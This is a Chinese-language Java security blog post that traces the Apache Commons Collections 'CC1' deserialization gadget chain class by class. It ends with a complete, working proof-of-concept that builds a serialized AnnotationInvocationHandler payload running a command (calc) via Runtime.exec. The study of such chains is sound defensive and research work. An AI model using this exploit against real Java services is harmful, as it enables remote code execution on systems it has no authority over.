---
title: Java反序列化利用链之CommonsCollections1
date: 2024-03-06 18:50:00 +0800
img_path: /
categories: [Java安全, Java反序列化]
tags: [Java安全, Java反序列化]     

---

# CommonsCollections1

[TOC]

## org.apache.commons.collections.functors.InvokerTransformer

危险类`InvokerTransformer`的实现如下：

![image-20240306152229843](assets/image-20240306152229843.png)

`InvokerTransformer`类实现的`transform`方法***可执行任意方法***，也是反序列化执行命令的关键。

![image-20240306152242657](assets/image-20240306152242657.png)

`transform`将解析构造方法传入的三个参数，执行`input`对象的`iMethodName`方法。

```java
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        Object invokerTransformer = new InvokerTransformer("exec", new
                Class[]{String.class}, new String[]{"calc"}).transform(r);
    }
```

以上例子等同于这样：

```java
    public static void main(String[] args) throws Exception {
        Runtime runtime  = Runtime.getRuntime();
        Class c = Runtime.class;
        Method method = c.getMethod("exec",String.class);
        method.invoke(runtime,"calc");
    }
```

现在既然知道了`InvokerTransformer`的`transform`方法能够调用危险方法，就可以往前推找一个能够调用`transform`的类。

## org.apache.commons.collections.map.TransformedMap

在类`TransformedMap`中存在一个`checkSetValue`调用了`transform`方法。

![image-20240306154716895](assets/image-20240306154716895.png)

如果我们能够控制`valueTransformer`为`InvokerTransformer`就可以利用`checkSetValue`调用任意方法。

往前跟进一下`valueTransformer`：

![image-20240306154939321](assets/image-20240306154939321.png)

可以看到`TransformedMap`的构造方法对`valueTransformer`赋值操作，但由于是`protected`方法，所以还需要找到哪里能够调用`TransformedMap`，在`TransformedMap`上方存在一个`decorate`方法正好符合。

```java
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

在这个方法中就可以看出`valueTransformer`值可控，我们可通过`TransformedMap`类的`decorate`方法传入`invokertansformdMap`就可以解决`checkSetValue`的参数问题了：

## org.apache.commons.collections.map.AbstractInputCheckedMapDecorator

然后就开始找哪里调用到了`checkSetValue`在`TransformedMap`的父类`AbstractInputCheckedMapDecorator`中：

![image-20240306161339888](assets/image-20240306161339888.png)

在Java中，`Map.Entry` 是一个表示 `Map` 接口中的键值对的接口。`Map` 接口是Java中用于存储键值对的集合接口，而 `Map.Entry` 就代表了这些键值对的条目。

`Map.Entry` 接口定义了两个主要的方法：

1. **getKey():** 用于获取键（key）。
2. **getValue():** 用于获取值（value）。

这个接口通常与`Map`的`entrySet()`方法一起使用，该方法返回一个包含`Map.Entry`对象的`Set`集合，其中每个`Map.Entry`对象代表`Map`中的一个键值对。		

遍历例子：

```java
 public static void main(String[] args) {
        // 创建一个Map
        Map<String, Integer> map = new HashMap<>();
        map.put("One", 1);
        map.put("Two", 2);
        map.put("Three", 3);

        // 使用 entrySet() 获取 Map 中的键值对
        for (Map.Entry<String, Integer> entry : map.entrySet()) {
            System.out.println("Key: " + entry.getKey() + ", Value: " + entry.getValue());
        }
    }
```

`AbstractInputCheckedMapDecorator`类中的 `MapEntry`类中的`setValue`方法其实就是`Map`中的`setValue`进行了重写（`AbstractInputCheckedMapDecorator`的父类实现了`Map`）

![image-20240306163816579](assets/image-20240306163816579.png)

`AbstractInputCheckedMapDecorator`类又引入了` Map.Entry `接口，还存在`setValue `方法，所以我们只需要进行常用的 `Map` 遍历，就可以调用 `setValue `方法，然后调用 `checkSetValue` 方法然后就变成了这样：

```java
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new
                InvokerTransformer("exec", new Class[]{String.class}, new
                Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();//new 一个 map
        map.put("key", "value");//对 map 进行赋值
        Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, invokerTransformer);
        for (Map.Entry entry : transformedmap.entrySet()) {//将transformedmap 传进去，会自动调用到父类里面的 setValue 方法：
            entry.setValue(r);
        }
    }
```

然后就需要找到某个类的`readObject`里面能够遍历`map`而且在遍历时调用了`setValue()`方法，并且能把`transformedmap`传进去。

## sun.reflect.annotation.AnnotationInvocationHandler;

这里有个坑点，CC1 在` jdk` 的包更新到 `8u71 `以后，就对漏洞点进行了修复（`CC1TransformedMap` 链去掉了 `Map.Entry` 的 `setValue `方法。

未修复前（jdk8u66）：

![image-20240306192241592](assets/image-20240306192241592.png)

修复后（jdk8u321）：

![image-20240306192434398](assets/image-20240306192434398.png)

可以很清楚的看到修复后的版本没有了`setValue()`。

接下来关注`AnnotationInvocationHandler`的构造方法看看什么可控：

![image-20240306201658405](assets/image-20240306201658405.png)

在构造方法中可以看到`memberValues`是可控的，也就是`Map`可控，然后我们就可以传入前面构造的`transformedmap`，再就是该类没有`pubilc`修饰，所以只能通过反射拿到这个类的构造方法。

```java
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
```

还有一个需要注意的点，在`AnnotationInvocationHandler`的`readObject`方法中：

![image-20240306205105066](assets/image-20240306205105066.png)

这里`var7`是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，所以我们需要一个注解并且它存在成员变量。注解`Target`、`SuppressWarnings` 中有个名为`value`的成员变量，所以我们就可以使用这个注解，并改第一个键值对的值为`value`

![image-20240306205526038](assets/image-20240306205526038.png)

![image-20240306211240072](assets/image-20240306211240072.png)

所以构造方法就可以这样传参：

```java
        Object o = annotationInvocationhdlConstructor.newInstance(Target.class, transformedmap);
```

或者这样：

```java
        Object o = annotationInvocationhdlConstructor.newInstance(SuppressWarnings.class, transformedmap);
```

捋一下：

直到现在我们知道`InvokerTransformer`的`transform` 方法可以调用任意方法，并且`TransformedMap`中的`checkSetValue`调用了`transform`方法。在`TransformedMap`的父类`AbstractInputCheckedMapDecorator`中`setValue`又调用了`checkSetValue`，所以可通过`AnnotationInvocationHandler`调用`readObject`时触发。

```java
AnnotationInvocationHandler.readObject-->Entry.setValue-->TransformedMap.checkSetValue
    -->InvokerTransformer.transform-->Runtime.getRuntime().exec()
```

但是在`Runtime`里看一下，发现它没有`serializable`接口，不能被序列化：

![image-20240306221435981](assets/image-20240306221435981.png)

这里可以运用反射来获取它的原型类，它的原型类`class`是存在`serializable`接口可以序列化的，在这可以看到`getRuntime()`方法，该方法会返回一个`Runtime`对象，所以我们可通过反射：

```java
Class c=Class.forName("java.lang.Runtime");                 //获取类原型
Method getRuntime= c.getDeclaredMethod("getRuntime",null);    //获取getRuntime方法，
Runtime r=(Runtime) getRuntime.invoke(null,null);  //获取实例化对象，因为该方法无无参方法，所以全为null
Method exec=c.getDeclaredMethod("exec", String.class);        //获取exec方法
exec.invoke(r,"calc");                                         //实现命令执行
Class rc = Class.forName("java.lang.Runtime");
```

利用前面`transform`方法实现上述代码：

```java
Class c=Class.forName("java.lang.Runtime");                 //获取类原型        
Method getRuntime = (Method) new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(c);
//这里模拟获取getRuntime方法，它的具体操作步骤类似之前
Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);
//这里模拟获取invoke方法
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
//这里模拟获取exec方法，并进行命令执行
```

但是这样写很繁琐，`Commons Collections`库中存在的`ChainedTransformer`类，它也存在`transform`方法可以帮我们遍历`InvokerTransformer`，并且调用`transform`方法。

## org.apache.commons.collections.functors.ChainedTransformer

`ChainedTransformer`方法实现了`Serializable`

![image-20240306212507850](assets/image-20240306212507850.png)

该类里调用了`transform`方法可以帮我们遍历`InvokerTransformer`，并且调用`transform`方法：

![image-20240306212604417](assets/image-20240306212604417.png)

然后就可以这样构造：
```java
        Transformer[] Transformers = new Transformer[]{
                new InvokerTransformer("getDeclaredMethod", new
                        Class[]{String.class, Class[].class}, new
                        Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new
                        Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new
                        Class[]{String.class}, new Object[]{"calc"})
        };
```

但是如何才能指定`Runtime.class`呢？也就是`this.iTransformers[i].transform(object);`的`object`为`Runtime.class`

## org.apache.commons.collections.functors.ConstantTransformer

`ConstantTransformer`这个类的构造方法可控制`transform`的返回值，这样就能控制指定`Runtime.class`：

![image-20240306225245387](assets/image-20240306225245387.png)

然后就可以这样构造：

```java
Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new
                        Class[]{String.class, Class[].class}, new
                        Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new
                        Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new
                        Class[]{String.class}, new Object[]{"calc"})
        };
```

这样构造之后就可以，第一次调用`ConstantTransformer`类的`transform`方法从而返回`Runtime.class`。

```java
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
```

此时`object`变为`Runtime.class`，同时作为参数传入`InvokerTransformer`类的`transform`方法，也就是这样：

```java
object = ConstantTransformer(Runtime.class).transform(xxx);
object = InvokerTransformer(xxx,xxx,xxx).transform(object); //此时括号中的object为Runtime.class
```

最终完整`CC1Poc`如下：

```java
package org.example.CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;


public class CC1Poc {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    public static void main(String[] args) throws Exception {
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new
                        Class[]{String.class, Class[].class}, new
                        Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new
                        Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new
                        Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new
                ChainedTransformer(Transformers);
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "aaa");
        Map<Object, Object> transformedmap =
                TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        Object o = annotationInvocationhdlConstructor.newInstance(SuppressWarnings.class, transformedmap);
        byte[] se = serialize(o);
        deserialize(se);
    }
}
```

